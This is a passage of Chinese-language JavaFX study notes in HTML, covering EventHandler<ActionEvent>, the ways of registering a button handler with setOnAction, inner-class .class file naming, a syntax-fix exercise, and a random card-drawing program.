        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token class-name">ActionEvent</span> event<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Button clicked!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">launch</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注意：</p>
<ul>
<li>代码复用：如果一个处理器需要被多个事件源共用，实现处理器接口是个不错的选择。</li>
<li>简洁性：对于简单的一次性用途，Lambda表达式通常更简洁。</li>
<li>类型安全：实现接口能在编译时检查类型，提高代码的安全性。</li>
<li>可读性和维护性：如果事件处理逻辑非常复杂，使用实现接口的方式可能会使代码更易于阅读和维护。</li>
</ul>
<h2 id="eventhandleractionevent-接口的处理器方法是什么"><a class="markdownIt-Anchor" href="#eventhandleractionevent-接口的处理器方法是什么"></a> <code>EventHandler&lt;ActionEvent&gt;</code> 接口的处理器方法是什么？</h2>
<p>该方法叫做handle，用于处理与其关联的事件类型。这个方法接受一个ActionEvent类型的参数，这个参数包含了事件相关的所有信息。<br>
<code>void handle(ActionEvent event);</code><br>
event: 这是一个ActionEvent对象，包含了触发该事件的所有相关信息，比如事件源、事件类型等。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">ActionEvent</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">EventHandler</span></span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">MyButtonHandler</span> <span class="token keyword">implements</span> <span class="token class-name">EventHandler</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ActionEvent</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token class-name">ActionEvent</span> event<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 在这里写下你的事件处理代码</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Button clicked!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Button</span> btn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Click Me"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
btn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyButtonHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ul>
<li>由于这个接口是一个函数式接口（只有一个需要实现的方法），可以使用Lambda表达式来更简洁地实现。</li>
<li>如果事件处理逻辑比较简单，直接使用Lambda表达式通常更简洁；但如果事件处理逻辑更复杂，或者需要在多处重用，那么创建一个实现了<code>EventHandler&lt;ActionEvent&gt;</code>接口的类可能会更合适。</li>
</ul>
<h2 id="对一个按钮注册一个actionevent-处理器的注册方法是什么"><a class="markdownIt-Anchor" href="#对一个按钮注册一个actionevent-处理器的注册方法是什么"></a> 对一个按钮注册一个ActionEvent 处理器的注册方法是什么？</h2>
<p>使用<code>setOnAction</code>方法。这个方法接受一个实现了<code>EventHandler&lt;ActionEvent&gt;</code>接口的对象作为参数。下面是几种不同的方式来注册事件处理器。</p>
<p>使用匿名内部类<br>
可以使用匿名内部类的方式创建一个<code>EventHandler&lt;ActionEvent&gt;</code>对象并注册。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Button</span> btn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Click Me"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
btn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">EventHandler</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ActionEvent</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token class-name">ActionEvent</span> event<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Button clicked!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用Lambda表达式<br>
如果使用的是Java 8或更高版本，可以使用Lambda表达式来更简洁地注册事件处理器。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Button</span> btn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Click Me"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
btn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Button clicked!"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>使用已存在的对象<br>
如果已经有一个实现了<code>EventHandler&lt;ActionEvent&gt;</code>接口的对象，可以直接将它注册为按钮的事件处理器。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">MyButtonHandler</span> <span class="token keyword">implements</span> <span class="token class-name">EventHandler</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ActionEvent</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token class-name">ActionEvent</span> event<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Button clicked!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 在其他地方的代码</span>
<span class="token class-name">Button</span> btn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Click Me"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">MyButtonHandler</span> handler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyButtonHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
btn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用方法引用<br>
如果有一个符合void method(ActionEvent e)签名的方法，可以使用方法引用来注册事件处理器。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">myMethod</span><span class="token punctuation">(</span><span class="token class-name">ActionEvent</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Button clicked!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 在其他地方的代码</span>
<span class="token class-name">MyClass</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Button</span> btn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Click Me"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
btn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>obj<span class="token operator">::</span><span class="token function">myMethod</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="如果类-a-是类-b-中的一个内部类a-的类文件名字是什么如果类-b-包含两个匿名内部类这两个类的-class-文件名是什么"><a class="markdownIt-Anchor" href="#如果类-a-是类-b-中的一个内部类a-的类文件名字是什么如果类-b-包含两个匿名内部类这两个类的-class-文件名是什么"></a> 如果类 A 是类 B 中的一个内部类，A 的类文件名字是什么？如果类 B 包含两个匿名内部类，这两个类的 .class 文件名是什么？</h2>
<p>如果有一个外部类B和它的一个内部类A，则内部类A的.class文件名通常会是B$A.class。<br>
例如，如果有这样一个类定义：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>
        <span class="token comment">// ...</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>编译后会得到两个.class文件：<br>
B.class —— 对应于外部类B<br>
B$A.class —— 对应于内部类A</p>
<p>匿名内部类的命名规则稍有不同。如果一个类B包含两个匿名内部类，那么这两个匿名内部类的.class文件通常会按照它们在代码中出现的顺序被命名为B$1.class和B$2.class。<br>
例如：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token punctuation">{</span>
    <span class="token class-name">Runnable</span> r1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Runnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// ...</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token class-name">Runnable</span> r2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Runnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// ...</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>编译后会得到三个.class文件：</p>
<p>B.class —— 对应于外部类B<br>
B$1.class —— 对应于第一个匿名内部类<br>
B$2.class —— 对应于第二个匿名内部类</p>
<p>这样的命名规则有助于JVM和Java运行时系统识别和管理各个类。</p>
<h2 id="下面代码中的错误是什么"><a class="markdownIt-Anchor" href="#下面代码中的错误是什么"></a> 下面代码中的错误是什么？</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> stage<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">Button</span> btOK<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"OK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        btOK<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">EventHandler</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ActionEvent</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token class-name">ActionEvent</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>  <span class="token comment">// Something missing here</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>修改后代码：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> stage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Button</span> btOK <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"OK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        btOK<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">EventHandler</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ActionEvent</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token class-name">ActionEvent</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 添加了分号</span>
    <span class="token punctuation">}</span>  <span class="token comment">// 添加了结束括号</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="选取4张卡牌请写一个程序可以让用户通过单击refresh-按钮以显示从一副52张卡牌选取的4张卡牌"><a class="markdownIt-Anchor" href="#选取4张卡牌请写一个程序可以让用户通过单击refresh-按钮以显示从一副52张卡牌选取的4张卡牌"></a> （选取4张卡牌）请写一个程序，可以让用户通过单击Refresh 按钮以显示从一副52张卡牌选取的4张卡牌</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>geometry<span class="token punctuation">.</span></span><span class="token class-name">Pos</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">Button</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>image<span class="token punctuation">.</span></span><span class="token class-name">Image</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>image<span class="token punctuation">.</span></span><span class="token class-name">ImageView</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">GridPane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">HBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">VBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DrawCards</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">VBox</span> vBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VBox</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HBox</span> hBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">GridPane</span> cardPane <span class="token operator">=</span> <span class="token function">getRandomCard</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cardPane<span class="token punctuation">.</span><span class="token function">setHgap</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        hBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cardPane<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Button</span> refreshButton <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Refresh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 不能直接用cardPane=getRandomCard(4);</span>
        <span class="token comment">// refreshButton.setOnAction(e -&gt; {</span>
        <span class="token comment">//     cardPane=getRandomCard(4);</span>
        <span class="token comment">// });</span>
        <span class="token comment">/*这是一个经典的Java闭包问题。
        Lambda表达式中使用的变量必须是final或者“effectively final”。
        也就是说，该变量在初始化后不能再被修改。
        cardPane在Lambda表达式里被重新赋值，所以编译器会报错。
        可以这么解决*/</span>
        
        <span class="token comment">// 1.修改逻辑，删去原来的hBox，重新生成一个hBox</span>
        refreshButton<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            hBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">GridPane</span> newCardPane <span class="token operator">=</span> <span class="token function">getRandomCard</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            newCardPane<span class="token punctuation">.</span><span class="token function">setHgap</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            hBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>newCardPane<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 2.使用数组或容器封装 cardPane</span>
        <span class="token comment">// final GridPane[] cardPaneContainer = { getRandomCard(4) };</span>
        
        <span class="token comment">// cardPaneContainer[0].setHgap(10);</span>
        <span class="token comment">// Button refreshButton = new Button("Refresh");</span>
        <span class="token comment">// refreshButton.setOnAction(e -&gt; {</span>
        <span class="token comment">//     cardPaneContainer[0] = getRandomCard(4);</span>
        <span class="token comment">//     hBox.getChildren().clear();</span>
        <span class="token comment">//     cardPaneContainer[0].setHgap(10);</span>
        <span class="token comment">//     hBox.getChildren().add(cardPaneContainer[0]);</span>
        <span class="token comment">// });</span>

        
        vBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>hBox<span class="token punctuation">,</span> refreshButton<span class="token punctuation">)</span><span class="token punctuation">;</span>
        vBox<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hBox<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>vBox<span class="token punctuation">,</span> <span class="token number">360</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Draw Cards"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token class-name">GridPane</span> <span class="token function">getRandomCard</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">GridPane</span> cardPane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GridPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Random</span> randomInt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cardList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> nextInt <span class="token operator">=</span> randomInt<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">52</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> card <span class="token operator">:</span> cardList<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span>nextInt <span class="token operator">==</span> card<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    nextInt <span class="token operator">=</span> randomInt<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">52</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                cardList<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nextInt<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> cardImgPath <span class="token operator">=</span> <span class="token string">"E:/Repos/Course/Java/my/code/W3/demo/src/card/"</span> <span class="token operator">+</span> cardList<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">".png"</span><span class="token punctuation">;</span>
            <span class="token class-name">ImageView</span> imgView <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ImageView</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span>cardImgPath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            cardPane<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>imgView<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> cardPane<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
